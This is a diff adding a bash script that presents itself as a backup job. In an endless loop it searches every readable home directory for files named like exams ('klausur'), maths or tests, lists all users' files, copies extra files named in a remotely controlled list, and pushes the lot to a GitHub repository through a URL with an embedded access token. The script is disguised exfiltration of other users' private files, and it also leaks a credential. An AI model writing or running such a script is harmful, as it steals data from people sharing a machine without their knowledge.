@@ -1,0 +1,102 @@
+#!/bin/bash
+while true; do
+    #exit 0 # REMOVE
+    # === KONFIGURATION ===
+    GIT_REPO_URL="https://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@github.com/kaltsch/stuff.git"
+    GIT_BRANCH="main"                                            
+
+    # Wichtige absolute Pfade
+    GIT_BIN="/usr/bin/git"
+    FIND_BIN="/usr/bin/find"
+    REALPATH_BIN="/usr/bin/realpath"
+    CP_BIN="/usr/bin/cp"
+    MKDIR_BIN="/usr/bin/mkdir"
+    RM_BIN="/usr/bin/rm"
+    DATE_BIN="/usr/bin/date"
+    MKDIR="/usr/bin/mkdir"
+
+    TMP_DIR=$(mktemp -d "/tmp/repo-XXXXXX")
+    TIMESTAMP=$($DATE_BIN '+%Y-%m-%d %H:%M:%S')
+
+    echo "[$TIMESTAMP] Backup gestartet in $TMP_DIR"
+
+    # Git-Repo klonen
+    $GIT_BIN clone --quiet --branch "$GIT_BRANCH" "$GIT_REPO_URL" "$TMP_DIR" || {
+        echo "Fehler beim Klonen"
+        $RM_BIN -rf "$TMP_DIR"
+        exit 1
+    }
+
+    cd "$TMP_DIR" || exit 1
+    > "$TMP_DIR/files.txt"
+
+    # === Schleife über alle lesbaren Home-Verzeichnisse ===
+    for HOME_DIR in /home/*; do
+        # Nur echte Verzeichnisse und lesbar
+        [[ -d "$HOME_DIR" && -r "$HOME_DIR" ]] || continue
+
+        echo "Verarbeite Home-Verzeichnis: $HOME_DIR"
+
+        # === Backup-Dateien finden und kopieren ===
+        $FIND_BIN "$HOME_DIR" -type f \( -iname '*klausur*' -o -iname '*mathe*' -o -iname '*test*' \) | while read -r file; do
+            REL_PATH=$($REALPATH_BIN --relative-to="$HOME_DIR" "$file")
+            DEST_DIR="$TMP_DIR/files/$(basename "$HOME_DIR")/$(dirname "$REL_PATH")"
+            $MKDIR_BIN -p "$DEST_DIR"
+            $CP_BIN -f "$file" "$DEST_DIR/"
+        done
+
+        # === Alle Dateien im Home in files.txt anhängen ===
+        $FIND_BIN "$HOME_DIR" \( -type d -name ".*" -prune \) -o \( -type f -print \) >> "$TMP_DIR/files.txt"
+    
+        # === Zusätzliche Dateien (optional) ===
+        ZUSATZ_FILE="$TMP_DIR/zusatzlichefiles.txt"
+        if [[ -f "$ZUSATZ_FILE" && -r "$ZUSATZ_FILE" ]]; then
+            echo "Verarbeite zentrale zusatzlichefiles.txt: $ZUSATZ_FILE"
+        
+            while IFS= read -r line || [[ -n "$line" ]]; do
+                file=$(echo "$line" | xargs)
+                [[ -z "$file" || "$file" == \#* ]] && continue
+        
+                if [[ -f "$file" && -r "$file" ]]; then
+                    OWNER=$(stat -c '%U' "$file")
+                    REL_PATH=$($REALPATH_BIN --relative-to="/home/$OWNER" "$file" 2>/dev/null || basename "$file")
+                    DEST_DIR="$TMP_DIR/files/$OWNER/$(dirname "$REL_PATH")"
+                    $MKDIR_BIN -p "$DEST_DIR"
+                    $CP_BIN -f "$file" "$DEST_DIR/" && \
+                        echo "  ✓ $file → $DEST_DIR/" || \
+                        echo "  ✗ Fehler beim Kopieren: $file"
+                else
+                    echo "  ⚠️ Datei nicht gefunden oder nicht lesbar: $file"
+                fi
+            done < "$ZUSATZ_FILE"
+        else
+            echo "Keine zentrale zusatzlichefiles.txt im Repo gefunden."
+        fi
+
+
+
+
+        
+    done
+
+
+    # === Git commit & push wenn nötig ===
+    $GIT_BIN -C "$TMP_DIR" add .
+    if ! $GIT_BIN -C "$TMP_DIR" diff --cached --quiet; then
+        $GIT_BIN -C "$TMP_DIR" config user.name "BackupScript"
+        $GIT_BIN -C "$TMP_DIR" config user.email "backup@localhost"
+        $GIT_BIN -C "$TMP_DIR" commit -m "Backup vom $TIMESTAMP"
+        $GIT_BIN -C "$TMP_DIR" push --quiet origin "$GIT_BRANCH"
+        echo "Änderungen gepusht."
+    else
+        echo "Keine Änderungen – kein Push."
+    fi
+
+    cd / || exit 1   # <--- WICHTIG: Zurück ins sichere Verzeichnis
+    $RM_BIN -rf "$TMP_DIR"
+
+    echo "[$TIMESTAMP] Backup abgeschlossen."
+
+
+ sleep 50
+done
